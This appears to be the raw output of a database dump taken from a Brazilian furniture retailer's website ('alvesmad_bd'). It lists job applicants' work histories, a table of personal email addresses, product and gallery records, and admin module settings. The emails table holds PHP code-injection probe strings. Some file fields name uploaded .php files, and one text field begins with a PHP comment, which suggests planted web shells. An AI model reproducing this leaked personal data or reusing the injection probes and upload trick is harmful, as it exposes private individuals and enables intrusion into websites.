+| 100    | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 101    | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 102    | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 103    | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 104    | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 105    | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 106    | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 107    | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 108    | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 109    | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 110    | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 111    | 48      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 112    | 49      | 2,8 ANOS                | ENGENHEIRO MECÂNICO                      | CLEAN SERVICE SERVIÇOS GERAIS                   | ENGENHEIRO                                                                                       |
+| 113    | 49      | 1 ANO                   | CONSULTOR TÉCNICO ESTAGIÁRIO             | ATLAS VEÍCULOS                                  | ATENDIMENTO TÉCNICO AO CLIENTE, QTA FIAT(QUALIDADE TO                                            |
+| 114    | 50      | ---------------------   | -----------------------------------      | ----------------------------                    | -------------------                                                                              |
+| 115    | 51      | 09/02/2009              | AUX. DE SUPRIMENTOS I                    | RIP - SERVIÇOS INDUSTRIAIS LTDA                 | Financeiro efetuar pagamentos, fazer recebimento de notas fiscais, controles de contratos etc... |
+| 116    | 52      | 18 meses                | eletrica                                 | integral                                        | eletricista                                                                                      |
+| 117    | 53      | 2007                    | SUPERVISOR                               | TERMITRA                                        | PRODUÇÃO                                                                                         |
+| 118    | 53      | 10/2008 A 02/2010       | ENCARREGADO                              | ENGEPAR ENGENHARIA                              | PRODUÇÃO                                                                                         |
+| 119    | 54      | 6 MESES                 | ASSISTENTE ADMINISRATIVO                 | DNA MOTOS                                       | ADMINISTRAÇÃO                                                                                    |
+| 120    | 54      | 8 MESES                 | AUXILIAR ADMINISTRATIVO                  | RC VEICULOS                                     | ADMINISTRAÇÃO                                                                                    |
+| 121    | 54      | 1 MES                   | FACILITADOR                              | FAMI HOUSE                                      | ATENDENTE DE COMPUTAÇÃO                                                                          |
+| 122    | 54      | 1 MES                   | VENDEDORA                                | G.ABC                                           | VENDAS                                                                                           |
+| 123    | 54      | 6 MESES                 | ALMOXARIFE                               | PP.GABY                                         | CONTROLE DE ESTOQUE                                                                              |
+| 124    | 54      | 2 ANOS                  | TEC. MECÂNICO                            | VALE                                            | ANALISTA DE MANUTENÇÃO                                                                           |
+| 125    | 55      | 03/2010 a 09/2010       | Montagem de monitores                    | Waytec                                          | Montadora                                                                                        |
+| 126    | 56      | 2004                    | CPD                                      | EQUATORIAL ALIMENTOS                            | MANUTENÇÃO EQUIPAMENTOS DE INFORMÁTICA                                                           |
+| 127    | 57      | 1 Ano e 6 Meses         | Técnico em Manutençâo                    | Vale                                            | Manutençâo                                                                                       |
+| 128    | 57      | Uma semana              | Auxiliar de Manutenção 2                 | Escad Rental                                    | Manutenção                                                                                       |
+| 129    | 57      | 6 meses                 | Representante de ven. SKY de paraupebas. | Tecsat                                          | Responsavel de vendas e atendimentos na cidade,                                                  |
+| 130    | 58      | <blank>                 | DEPARTAMENTO PESSOAL                     | VITORIA REGIA CONTABILIDADE                     | AUXILIAR DE DPTO PESSOAL                                                                         |
+| 131    | 58      | 2 ANOS                  | CAIXA                                    | BRANDÃO SUPERMERCADO                            | OPERADORA DE CAIXA                                                                               |
+| 132    | 59      | 01 ano e 06 meses       | Auxiliar de Serviços Gerais              | Clean Gestão Ambiental                          | Auxiliar de Serviços Gerais                                                                      |
+| 133    | 59      | 01 ano e 06 meses       | Auxiliar de Serviços Gerais              | Eme Serviços                                    | Auxiliar de Serviços Gerais                                                                      |
+| 134    | 59      | 02 anos                 | Vigilante Feminino                       | Grupo Sacramenta                                | Vigilante Feminino                                                                               |
+| 135    | 60      | 07/2007-07/2010         | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 136    | 60      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 137    | 61      | <blank>                 | Auxiliar Administrativo                  | Maquipesa Serviços Ltda                         | Apontador                                                                                        |
+| 138    | 61      | Cursando                | <blank>                                  | <blank>                                         | <blank>                                                                                          |
+| 139    | 62      | 01 a 06 de 2010         | ajundante                                | Gtel                                            | montagem e fabricação de pesa                                                                    |
+| 140    | 63      | 01/02 A 0608/2005       | ALMOXARIFE                               | SEQUI SERVIÇOS E EQUIPAMENTOS LTDA              | ALMOXARIFE                                                                                       |
+| 141    | 63      | <blank>                 | ALMOXARIFE                               | AXXO CONSTRUTORA LTDA                           | ALMOXARIFE                                                                                       |
+| 142    | 64      | 2008                    | Montador                                 | Ibraço                                          | <blank>                                                                                          |
+| 143    | 64      | 03/2010  06/2010        | Soldador ER                              | Bpres. Nacional de Engenharia LTDA              | <blank>                                                                                          |
+| 144    | 64      | 12/2008    10/2009      | Soldador MIG                             | Bpres. Nacional de Engenharia LTDA              | <blank>                                                                                          |
+| 145    | 65      | noite                   | programer                                | autoguiabr                                      | programer                                                                                        |
+| 146    | 66      | 01/09/2009 a 20/11/2009 | almoxarifado                             | distribuidora cummins minas                     | almoxarife                                                                                       |
+| 147    | 66      | 11/08/2008 a 19/12/2008 | almoxarifado                             | ranportadora rapidão cometa                     | almoxarife                                                                                       |
+| 148    | 67      | <blank>                 | Analista                                 | Agbrasilweb                                     | Funcao                                                                                           |
+| 149    | 67      | <blank>                 | estagiaro                                | Fadenor                                         | Funcao                                                                                           |
+| 150    | 68      | <blank>                 | <blank>                                  | <blank>                                         | <blank>                                                                                          |
++--------+---------+-------------------------+------------------------------------------+-------------------------------------------------+--------------------------------------------------------------------------------------------------+
+
+Database: alvesmad_bd
+Table: curriculos
+[0 entries]
++--------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+----------+-------------------+
+| cur_id | cur_dat | cur_cad | cur_ema | cur_cnh | cur_ent | cur_per | cur_cpf | cur_cel | cur_cur | cur_cat | cur_sta | cur_nas | cur_end | cur_msg | cur_esc | cur_tel | cur_nome | cur_qualificacoes |
++--------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+----------+-------------------+
++--------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+---------+----------+-------------------+
+
+Database: alvesmad_bd
+Table: dicas
+[3 entries]
++--------+------------+-------------+-------------------------------------------------------+-----------------------------------+
+| dic_id | dic_data   | dic_foto    | dic_texto                                             | dic_titulo                        |
++--------+------------+-------------+-------------------------------------------------------+-----------------------------------+
+| 10     | 2016-04-12 | 4384151.jpg | <div><?</div>\r\n<div>//add php tags before usage</di | Como cuidar dos móveis de madeira |
+| 11     | 2014-11-04 | 6423730.txt | <p>A escolha dos m\xf3veis \xe9 fundamental pa        | Como reformar seus móveis         |
+| 14     | 2014-11-04 | 6433191.php | <p>fdsfd</p>                                          | fdsfdsf                           |
++--------+------------+-------------+-------------------------------------------------------+-----------------------------------+
+
+Database: alvesmad_bd
+Table: emails
+[31 entries]
++----------+---------+------------------------------------------------------------------+------------+---------------------------------------------------------------------------------+
+| email_id | cel     | nome                                                             | data       | email_desc                                                                      |
++----------+---------+------------------------------------------------------------------+------------+---------------------------------------------------------------------------------+
+| 18       | <blank> | ana                                                              | 0000-00-00 | ana@agbrasilweb.com.br                                                          |
+| 19       | <blank> | <blank>                                                          | 0000-00-00 | <blank>                                                                         |
+| 20       | <blank> | aline.sousa45                                                    | 0000-00-00 | aline.sousa45@hotmail.com                                                       |
+| 21       | <blank> | mark357177                                                       | 0000-00-00 | mark357177@hotmail.com                                                          |
+| 22       | <blank> | jimos4581rt                                                      | 0000-00-00 | jimos4581rt@hotmail.com                                                         |
+| 23       | <blank> | jfvynms4281rt                                                    | 0000-00-00 | jfvynms4281rt@hotmail.com                                                       |
+| 24       | <blank> | adrianoponto                                                     | 0000-00-00 | adrianoponto@outlook.com                                                        |
+| 25       | <blank> | jimos45812rt1                                                    | 0000-00-00 | jimos45812rt1@hotmail.com                                                       |
+| 26       | <blank> | ecrev22vtv                                                       | 0000-00-00 | ecrev22vtv@hotmail.com                                                          |
+| 27       | <blank> | ec12342vtv                                                       | 0000-00-00 | ec12342vtv@hotmail.com                                                          |
+| 28       | <blank> | jimosa4ccf2                                                      | 0000-00-00 | jimosa4ccf2@hotmail.com                                                         |
+| 29       | <blank> | support                                                          | 0000-00-00 | support@goldentabs.com                                                          |
+| 30       | <blank> | jimosa4xf2                                                       | 0000-00-00 | jimosa4xf2@hotmail.com                                                          |
+| 31       | <blank> | support                                                          | 0000-00-00 | support@genericpharmacydrug.com                                                 |
+| 32       | <blank> | bggfbx                                                           | 0000-00-00 | bggfbx@hotmail.com                                                              |
+| 33       | <blank> | YWx2ZXNtYWRlaXJhcy5jb20uYnI{${print(238947899389478923-345673435 | 0000-00-00 | YWx2ZXNtYWRlaXJhcy5jb20uYnI{${print(238947899389478923-34567343546345)}}        |
+| 34       | <blank> | print(238947899389478923-34567343546345);                        | 0000-00-00 | print(238947899389478923-34567343546345);                                       |
+| 35       | <blank> | YWx2ZXNtYWRlaXJhcy5jb20uYnI<?=print(238947899389478923-345673435 | 0000-00-00 | YWx2ZXNtYWRlaXJhcy5jb20uYnI<?=print(238947899389478923-34567343546345);?>       |
+| 36       | <blank> | YWx2ZXNtYWRlaXJhcy5jb20uYnI'<?php print(238947899389478923-34567 | 0000-00-00 | YWx2ZXNtYWRlaXJhcy5jb20uYnI'<?php print(238947899389478923-34567343546345); ?>' |
+| 37       | <blank> | YWx2ZXNtYWRlaXJhcy5jb20uYnI"<?php print(238947899389478923-34567 | 0000-00-00 | YWx2ZXNtYWRlaXJhcy5jb20uYnI"<?php print(238947899389478923-34567343546345); ?>" |
+| 38       | <blank> | YWx2ZXNtYWRlaXJhcy5jb20uYnI'{${print(238947899389478923-34567343 | 0000-00-00 | YWx2ZXNtYWRlaXJhcy5jb20uYnI'{${print(238947899389478923-34567343546345)}}'      |
+| 39       | <blank> | YWx2ZXNtYWRlaXJhcy5jb20uYnI"{${print(238947899389478923-34567343 | 0000-00-00 | YWx2ZXNtYWRlaXJhcy5jb20uYnI"{${print(238947899389478923-34567343546345)}}"      |
+| 40       | <blank> | YWx2ZXNtYWRlaXJhcy5jb20uYnI'];print(238947899389478923-345673435 | 0000-00-00 | YWx2ZXNtYWRlaXJhcy5jb20uYnI'];print(238947899389478923-34567343546345);//       |
+| 41       | <blank> | YWx2ZXNtYWRlaXJhcy5jb20uYnI"];print(238947899389478923-345673435 | 0000-00-00 | YWx2ZXNtYWRlaXJhcy5jb20uYnI"];print(238947899389478923-34567343546345);//       |
+| 42       | <blank> | YWx2ZXNtYWRlaXJhcy5jb20uYnI');print(238947899389478923-345673435 | 0000-00-00 | YWx2ZXNtYWRlaXJhcy5jb20uYnI');print(238947899389478923-34567343546345);//       |
+| 43       | <blank> | YWx2ZXNtYWRlaXJhcy5jb20uYnI");print(238947899389478923-345673435 | 0000-00-00 | YWx2ZXNtYWRlaXJhcy5jb20uYnI");print(238947899389478923-34567343546345);//       |
+| 44       | <blank> | YWx2ZXNtYWRlaXJhcy5jb20uYnI}print(238947899389478923-34567343546 | 0000-00-00 | YWx2ZXNtYWRlaXJhcy5jb20uYnI}print(238947899389478923-34567343546345);{          |
+| 45       | <blank> | uuvovo                                                           | 0000-00-00 | uuvovo@yyxpyx.com                                                               |
+| 46       | <blank> | vvqzkz                                                           | 0000-00-00 | vvqzkz@tjotrr.com                                                               |
+| 47       | <blank> | ajthcw                                                           | 0000-00-00 | ajthcw@slyafi.com                                                               |
+| 48       | <blank> | MTU0ODQwNzQ2Ng'"`                                                | 0000-00-00 | MTU0ODQwNzQ2Ng'"`                                                               |
++----------+---------+------------------------------------------------------------------+------------+---------------------------------------------------------------------------------+
+
+Database: alvesmad_bd
+Table: especialidade
+[0 entries]
++--------+----------+-----------+
+| cli_id | cli_nome | cli_email |
++--------+----------+-----------+
++--------+----------+-----------+
+
+Database: alvesmad_bd
+Table: eventos
+[4 entries]
++--------+-----------+---------+---------+---------+---------+------------------+------------+----------+--------------+-----------+-------------+----------------+
+| eve_id | eve_video | eve_end | eve_tel | eve_cat | eve_cel | eve_nome         | eve_data   | eve_desc | eve_foto     | eve_local | eve_mostrar | eve_cod_imagem |
++--------+-----------+---------+---------+---------+---------+------------------+------------+----------+--------------+-----------+-------------+----------------+
+| 12     | <blank>   | <blank> | <blank> | <blank> | <blank> | Sala de TV       | 0000-00-00 | <blank>  | 8565640.jpg  | <blank>   | 1           | <blank>        |
+| 14     | <blank>   | <blank> | <blank> | <blank> | <blank> | Dormitório       | 0000-00-00 | <blank>  | 9550971.jpg  | <blank>   | 1           | <blank>        |
+| 15     | <blank>   | <blank> | <blank> | <blank> | <blank> | Sala de Jantar   | 0000-00-00 | <blank>  | 9581728.jpg  | <blank>   | 1           | <blank>        |
+| 16     | <blank>   | <blank> | <blank> | <blank> | <blank> | Mesas e Cadeiras | 0000-00-00 | <blank>  | 10022761.jpg | <blank>   | 1           | <blank>        |
++--------+-----------+---------+---------+---------+---------+------------------+------------+----------+--------------+-----------+-------------+----------------+
+
+Database: alvesmad_bd
+Table: eventos_fotos
+[43 entries]
++--------+---------+---------------------+---------------+--------------+
+| fot_id | fot_eve | fot_link            | fot_nome      | fot_foto     |
++--------+---------+---------------------+---------------+--------------+
+| 61     | 2       | <blank>             | Cliente 3     | 8374820.jpg  |
+| 63     | 2       | <blank>             | Cliente 1     | 9262276.jpg  |
+| 64     | 2       | http://teste.com.br | Teste         | 9264541.jpg  |
+| 65     | 8       | <blank>             | <blank>       | 3203068.jpg  |
+| 66     | 9       | <blank>             | <blank>       | 3206045.jpg  |
+| 67     | 9       | <blank>             | <blank>       | 8553668.jpg  |
+| 68     | 9       | <blank>             | <blank>       | 8553478.jpg  |
+| 69     | 9       | <blank>             | Teste01       | 8553624.jpg  |
+| 70     | 9       | <blank>             | Teste         | 8553400.jpg  |
+| 80     | 10      | <blank>             | <blank>       | 11253229.jpg |
+| 88     | 10      | <blank>             | <blank>       | 11305213.jpg |
+| 91     | 12      | <blank>             | <blank>       | 9523925.jpg  |
+| 92     | 14      | <blank>             | <blank>       | 9561663.jpg  |
+| 93     | 14      | <blank>             | Dormitório 02 | 9560979.jpg  |
+| 94     | 14      | <blank>             | Dormitório 01 | 9561953.jpg  |
+| 95     | 15      | <blank>             | <blank>       | 9595653.jpg  |
+| 96     | 15      | <blank>             | <blank>       | 9595711.jpg  |
+| 97     | 15      | <blank>             | <blank>       | 9595733.jpg  |
+| 98     | 16      | <blank>             | <blank>       | 10024813.jpg |
+| 99     | 16      | <blank>             | <blank>       | 10025021.jpg |
+| 100    | 16      | <blank>             | <blank>       | 10025033.jpg |
+| 101    | 12      | <blank>             | <blank>       | 10103245.jpg |
+| 102    | 12      | <blank>             | <blank>       | 10103114.jpg |
+| 103    | 12      | <blank>             | <blank>       | 10103067.jpg |
+| 104    | 12      | <blank>             | <blank>       | 10103089.jpg |
+| 105    | 17      | <blank>             | <blank>       | 10262172.jpg |
+| 106    | 17      | <blank>             | <blank>       | 10261813.jpg |
+| 107    | 17      | <blank>             | <blank>       | 10262095.jpg |
+| 108    | 17      | <blank>             | <blank>       | 10262780.jpg |
+| 109    | 12      | <blank>             | <blank>       | 10311190.jpg |
+| 110    | 17      | <blank>             | <blank>       | 12151763.jpg |
+| 111    | 17      | <blank>             | <blank>       | 12172615.jpg |
+| 112    | 18      | <blank>             | <blank>       | 8021427.jpg  |
+| 113    | 18      | <blank>             | <blank>       | 8020776.jpg  |
+| 114    | 18      | <blank>             | <blank>       | 8020791.jpg  |
+| 115    | 19      | <blank>             | <blank>       | 8034926.jpg  |
+| 116    | 19      | <blank>             | <blank>       | 8034537.jpg  |
+| 117    | 20      | <blank>             | <blank>       | 8084417.jpg  |
+| 118    | 20      | <blank>             | <blank>       | 8084972.jpg  |
+| 119    | 21      | <blank>             | <blank>       | 8131322.jpg  |
+| 120    | 21      | <blank>             | <blank>       | 8131008.jpg  |
+| 121    | 23      | <blank>             | <blank>       | 8503889.jpg  |
+| 122    | 23      | <blank>             | <blank>       | 8502995.jpg  |
++--------+---------+---------------------+---------------+--------------+
+
+Database: alvesmad_bd
+Table: marcas
+[1 entry]
++--------+----------+----------+----------+--------------+
+| mar_id | mar_desc | mar_nome | mar_link | mar_foto     |
++--------+----------+----------+----------+--------------+
+| 55     | <blank>  | dasasd   | http://  | 10532706.php |
++--------+----------+----------+----------+--------------+
+
+Database: alvesmad_bd
+Table: modulos
+[17 entries]
++--------+------------------------+----------+-----------+------------+------------+----------------+----------------+----------------+------------------+---------------------+
+| mod_id | mod_nome               | mod_menu | mod_ordem | mod_pg_pre | mod_status | mod_pg_novo    | mod_pg_edit    | mod_pg_lista   | mod_pg_config    | mod_bd_config       |
++--------+------------------------+----------+-----------+------------+------------+----------------+----------------+----------------+------------------+---------------------+
+| 1      | Usuarios do sistema    | sim      | 1         | usu        | 2          | usu_novo       | usu_edit       | usuarios       | usu_config       | config_usuarios     |
+| 3      | Categorias dinamicas   | sim      | 3         | cat        | 2          | cat_novo       | cat_edit       | categorias     | cat_config       | config_categorias   |
+| 4      | Produtos administrador | nao      | 4         | pro        | 2          | pro_novo       | pro_edit       | produtos       | pro_config       | config_produtos     |
+| 5      | Parceiros              | sim      | 5         | mar        | 1          | mar_novo       | mar_edit       | marcas         | mar_config       | config_marcas       |
+| 12     | Atendimento            | nao      | 5         | fot        | 1          | fot_eve_novo   | fot_eve_edit   | fotos_eve      | <blank>          | config_atendimento  |
+| 13     | Dicas                  | sim      | 7         | dic        | 1          | dic_novo       | dic_edit       | dicas          | dic_config       | config_dicas        |
+| 14     | Galeria                | nao      | 6         | eve        | 2          | eve_novo       | eve_edit       | eventos        | eve_config       | config_eventos      |
+| 15     | Galeria                | nao      | 11        | eve        | 2          | eve_novo&cat=2 | eve_edit       | eventos&cat=2  | eve_config       | config_portifolio   |
+| 16     | Clientes               | nao      | 10        | fot        | 1          | fot_novo       | fot_edit       | fot_eve&eve=2  | fot_config       | config_clientes     |
+| 17     | Equipamentos           | nao      | 12        | fotos_eve  | 1          | fotos_eve_novo | fotos_eve_edit | eventos&cat=3  | fotos_eve_config | config_equipamentos |
+| 18     | Infra-estrutura        | nao      | 11        | fot        | 1          | fot_novo       | fot_edit       | fot_eve&eve=11 | fot_config       | config_infraestrut  |
+| 20     | Informativos           | nao      | 20        | inf        | 2          | inf_novo       | inf_edit       | informativos   | inf_config       | config_informativos |
+| 22     | Categorias             | nao      | 2         | cat_2      | 2          | cat_novo_2     | cat_edit_2     | categorias_2   | cat_config       | config_categorias_2 |
+| 24     | Emails                 | sim      | 22        | cat        | 2          | mala_novo      | mala_edit      | mala           | mala_config      | config_email        |
+| 26     | Fornecedores           | nao      | 11        | <blank>    | 1          | <blank>        | <blank>        | <blank>        | <blank>          | config_fornecedores |
+| 27     | Curriculos             | nao      | 10        | <blank>    | 1          | <blank>        | <blank>        | <blank>        | <blank>          | config_curriculos   |
+| 28     | Arquivo                | nao      | 0         | arq        | 1          | arq_novo       | arq_edit       | arquivos       | arq_config       | config_arquivos     |
++--------+------------------------+----------+-----------+------------+------------+----------------+----------------+----------------+------------------+---------------------+
+
+Database: alvesmad_bd
+Table: paisagismo
+[0 entries]
++--------+----------+----------+-----------+
+| pro_id | pro_foto | pro_nome | pro_foto2 |
++--------+----------+----------+-----------+
++--------+----------+----------+-----------+
+
+Database: alvesmad_bd
+Table: produtos
+[38 entries]
++--------+-----------+------------+---------------------+---------+---------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------------------------------+--------------+----------+-----------+-----------+-----------+--------------+----------------+----------------+--------------------+--------------------+---------------------+---------------------+---------------------------+----------------------------+
+| pro_id | pro_video | cat_id_aux | pro_disponibilidade | pro_des | pro_cat | pro_desc                                                                                                                                                                                                         | pro_nome                                      | pro_foto     | pro_peso | pro_marca | pro_preco | pro_promo | pro_detalhes | pro_desconto_1 | pro_desconto_2 | pro_especificacoes | pro_preco_anterior | pro_caracteristicas | pro_titulo_detalhes | pro_titulo_especificacoes | pro_titulo_caracteristicas |
++--------+-----------+------------+---------------------+---------+---------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------------------------------------+--------------+----------+-----------+-----------+-----------+--------------+----------------+----------------+--------------------+--------------------+---------------------+---------------------+---------------------------+----------------------------+
+| 64     | <blank>   | 1          | <blank>             | 1       | 43      | <p>\xa0<span style="font-family: Arial; text-align:                                                                                                                                                              | Refresco Magro Lowçucar 8g - Diversos Sabores | 3201718.jpg  | <blank>  | 0         | <blank>   | nao       | <blank>      | <blank>        | <blank>        | <blank>            | <blank>            | <blank>             | <blank>             | <blank>                   | <blank>                    |
+| 68     | <blank>   | 1          | <blank>             | 1       | 42      | <p>Estes Cookies s\xe3o integrais e ricos em fibra                                                                                                                                                               | Cookie                                        | 3040276.jpg  | <blank>  | 0         | <blank>   | nao       | <blank>      | <blank>        | <blank>        | <blank>            | <blank>            | <blank>             | <blank>             | <blank>                   | <blank>                    |
+| 73     | NULL      | 1          | <blank>             | 1       | 49      | <blank>                                                                                                                                                                                                          | Carregadeira                                  | 3103139.jpg  | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 74     | NULL      | 1          | <blank>             | 1       | 48      | <blank>                                                                                                                                                                                                          | Caminhão 3/4                                  | 3111151.jpg  | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 75     | NULL      | 1          | <blank>             | 1       | 50      | <blank>                                                                                                                                                                                                          | Escavadeira                                   | 3120845.jpg  | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 80     | NULL      | 1          | <blank>             | 1       | 47      | Tábuas de Madeira                                                                                                                                                                                                | Tábuas de Madeira                             | 12535542.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 81     | NULL      | 1          | <blank>             | 1       | 60      | <p>Charme e beleza e graciosidade em seu escrit&oacute;rio. Ela \xe9 girat\xf3ria, conta com alavanc                                                                                                             | Cadeira para escritório                       | 8482208.jpg  | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 82     | NULL      | 1          | <blank>             | 1       | 60      | <p><span style="font-family: Tahoma, Arial, Verdana, sans-serif; font-size: 13px;">Mesa de canto para computador com 3 gavetas e 2 portas, ideal para sua casa ou escrit\xf3rio. Produzido com mat\xe9ria prima  | Estação de trabalho                           | 8514699.jpg  | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 83     | NULL      | 1          | <blank>             | 1       | 64      | <p>Charme e bom gosto para a sua casa!\xa0Com revest                                                                                                                                                             | Poltrona                                      | 8551712.jpg  | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 84     | NULL      | 1          | <blank>             | 1       | 60      | <p>Ideal para voc\xea que trabalha horas no computa                                                                                                                                                              | Estação de Trabalho - Tabaco                  | 11224750.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 85     | NULL      | 1          | <blank>             | 1       | 60      | <p>Girat\xf3ria com estrutura e bra\xe7os em a                                                                                                                                                                   | Cadeira Importada - Preta                     | 11254035.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 86     | NULL      | 1          | <blank>             | 1       | 60      | <p>\xa0Complete a decora\xe7\xe3o de seu esp                                                                                                                                                                     | Mesa p/ Computador                            | 11286033.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 87     | NULL      | 1          | <blank>             | 1       | 64      | <p>Conforto e Qualidade para sua casa! \xa0Ideal par                                                                                                                                                             | Poltrona Reclinável                           | 11320572.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 88     | NULL      | 1          | <blank>             | 1       | 64      | <p>Com porta revistas na lateral do bra\xe7o, meca                                                                                                                                                               | Poltrona Reclinável - Marrom                  | 11351603.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 89     | NULL      | 1          | <blank>             | 1       | 64      | <p>Moderna e sofisticada, vai proporcionar ao seu ambiente maior comodidade e qualidade. Possui bra\xe7o                                                                                                         | Poltrona vermelha                             | 11391796.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 90     | NULL      | 1          | <blank>             | 1       | 54      | <p><font color="#404040">Com esse Porta Retrato voc&ecirc; poder\xe1 dividir com prazer e eleg\xe2nci                                                                                                            | Porta Retrato Multiphoto - Preto              | 11446033.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 91     | NULL      | 1          | <blank>             | 1       | 55      | <p>Essa cafeteira possui porta filtro com filtro espec\xedfico para sach\xea e outro espec\xedfic                                                                                                                | Cafeteira manual                              | 11491770.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 92     | NULL      | 1          | <blank>             | 1       | 56      | <p>Produto elaborado para clientes que priorizam o conforto e sofistica\xe7\xe3o com o melhor custo/                                                                                                             | Tapete - 100x150 cm                           | 11535884.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 93     | NULL      | 1          | <blank>             | 1       | 56      | <p>Produto elaborado para clientes que priorizam o conforto e sofistica\xe7\xe3o com o melhor custo/                                                                                                             | Tapete - 100x150 cm - Bege                    | 11570179.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 94     | NULL      | 1          | <blank>             | 1       | 56      | <p>Produto elaborado para clientes que priorizam o conforto e sofistica\xe7\xe3o com o melhor custo/                                                                                                             | 150x200 cm - Vermelho                         | 11594893.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 95     | NULL      | 1          | <blank>             | 1       | 56      | <p>Produto elaborado para clientes que priorizam o conforto e sofistica\xe7\xe3o com o melhor custo/                                                                                                             | 100x150 cm - Violeta                          | 12026246.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 96     | NULL      | 1          | <blank>             | 1       | 56      | <p>Produto elaborado para clientes que priorizam o conforto e sofistica\xe7\xe3o com o melhor custo/                                                                                                             | 200x300 cm - Roxo                             | 12056575.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 97     | NULL      | 1          | <blank>             | 1       | 56      | <p>\xa0R\xfastico, mas ao mesmo tempo descontra&                                                                                                                                                                 | 200X300 CM - AZUL                             | 12101256.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 98     | NULL      | 1          | <blank>             | 1       | 57      | <p>O produto \xe9 r\xfastico e\xa0sofisticad                                                                                                                                                                     | Almofada Artesanal 70x70 cm - Tabaco          | 12183449.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 99     | NULL      | 1          | <blank>             | 1       | 57      | <p>D\xea um toque de sofistica\xe7\xe3o ao                                                                                                                                                                       | Almofada florida 40x40                        | 12213546.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 100    | NULL      | 1          | <blank>             | 1       | 57      | <p>D\xea um toque de sofistica\xe7\xe3o ao                                                                                                                                                                       | Almofada listrada 40x40                       | 12223324.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
